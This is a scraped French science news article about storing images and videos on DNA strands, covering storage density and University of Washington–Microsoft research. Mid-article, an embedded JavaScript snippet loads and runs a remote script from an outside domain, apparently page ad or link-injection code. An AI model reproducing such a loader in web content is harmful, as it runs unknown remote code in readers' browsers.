{"title": "Des videos enregistrees... sur de l'ADN", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2016-04-10", "content": "En 2016, des chercheurs parvenaient a enregistrer des images et des videos sur des brins d'ADN. Loin d'un exemple de physique amusante, l'experience s'inscrit dans la continuite de recherches sur l'exploitation de cette molecule cle des etre vivants. La densite du stockage est sans commune mesure avec les procedes actuels et, de plus, les donnees pourraient etre conservees sur de tres longues periodes, au-dela de plusieurs generations, a la difference de nos supports ephemeres. Article paru le 10 avril 2016 En 1997, le biologiste Jack Cohen et le mathematicien Ian Stewart ont introduit dans leur livre  Figments of Reality : The Evolution of the Curious Mind  un neologisme, celui d' << extelligence >> . Il designe l'information et l' intelligence  collective de l'humanite sous forme d'oeuvres culturelles, de livres, de  DVD , de bibliotheques, de  reseaux sociaux  ainsi que les interactions culturelles et intellectuelles entre les membres de l'humanite. On peut donc penser l'extelligence comme l'intelligence et la memoire d'une sorte de  cerveau  collectif de l'humanite. Cette extelligence risque d'etre serieusement endommagee au cours du XXI e  siecle et il est bien possible que nos descendants du prochain siecle soient frappes d' amnesie  bien pire que celle qui a frappe l'Europe a la suite de la chute de l'Empire romain, laquelle nous a fait perdre bon nombre des accomplissements et des oeuvres de la culture grecque. Il y a pour cela deux raisons. La premiere est que l' energie  permettant de faire fonctionner cette extelligence et de la conserver risque fort de nous faire defaut. Les ressources en  energies fossiles  vont s'epuiser ou pour le moins seront indisponibles si l'on veut eviter de trop destabiliser le  climat . Notre civilisation technologique pourrait donc bien chuter exactement comme l'a fait l'Empire romain. La seconde raison est que la quantite d'informations que produit l'humanite de facon encore exponentiellement croissante devient de plus en plus volatile a l'heure du  numerique . Pensons aux videos sur  YouTube , a nos emails, nos pages  Facebook  ou encore les livres numeriques. On aimerait pouvoir stocker ces donnees sur des supports capables de durer des siecles.  Or , que sont devenus les fichiers qui tournaient sur nos  ordinateurs  il y a 20 ans, les  vinyles  et autre bandes VHS d'il y a seulement 30 ans ? Tous les films, images, e-mails et autres donnees numeriques contenus dans 600 smartphones ordinaires peuvent etre stockes dans le compose rose pale a base d'ADN a l'extremite de ce tube a essai. (c)  Tara Brown Photography, University of Washington                               Dix milliards de fois la densite de stockage d'un CD Plus concretement, il nous faut donc trouver des alternatives aux  serveurs  et aux  disques durs  qui non seulement soient capables de stocker de plus grandes quantites d'informations mais aussi de facon durable, respectueuse de l'environnement et a tres bas prix. Cela semble etre la quadrature du cercle mais on reflechit depuis quelques annees a une solution. Elle consiste a utiliser le plus formidable et le plus durable support d'informations invente par la vie : l' ADN .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le principe de la methode consiste a encoder une information en binaire sous la forme d'une serie de bases de l' ADN  representees par les lettres A, C, G et T. Il faut ensuite synthetiser un brin d'ADN contenant cette information puis le stocker, par exemple dans une nanosphere de  silice . L'ADN peut ulterieurement etre extrait, sequence et decode. Une premiere preuve de la faisabilite de cette technique a ete donnee il y a quelque temps en enregistrant un livre entier, soit 5,37 megabits, dans seulement un picogramme d'ADN (un millionieme de millionieme de gramme). Cela represente une densite de stockage spectaculaire d'un million de gigabits par centimetre cube, c'est-a-dire plus de 10 milliards de fois la densite de stockage d'un  CD . Parmi les chercheurs qui developpent des dispositifs pour ecrire et lire des informations sur une memoire a base d'ADN, on trouve par exemple les membres du  Molecular Information Systems Lab  de l'universite de Washington. En collaboration avec des membres de Microsoft Research, ils ont mis au point une nouvelle technique pour concretiser cet objectif. Afin d'atteindre une haute densite de stockage et de reduire les erreurs liees au processus d'enregistrement et de lecture, ils ont notamment fractionne l'information en plusieurs brins d'ADN qu'ils ont deshydrates. Lors d'un colloque de l' ACM International Conference on Architectural Support for Programming Languages and  Operating Systems , les chercheurs ont presente leurs derniers travaux dans un  article . Ils y annoncent avoir reussi a enregistrer et a lire sans erreurs des fichiers d'images ainsi que des videos montrant des interviews des juges et des  avocats  impliques dans le tribunal charge de juger les crimes de guerre commis au Rwanda. Selon les chercheurs, a terme, des serveurs de la taille de supermarches n'occuperont plus que le  volume  d'un cube de  sucre . Kezako : comment faire une analyse ADN ?                       L'ADN, cette molecule presente dans toutes les cellules vivantes renferme les cles du developpement et du fonctionnement d'un organisme. Nous avons actuellement les moyens de la sequencer, pour mieux la comprendre. Unisciel et l'Universite de Lille 1 nous expliquent, avec le programme Kezako, comment percer les mysteres de cette molecule.                                       ", "theme": "tech"}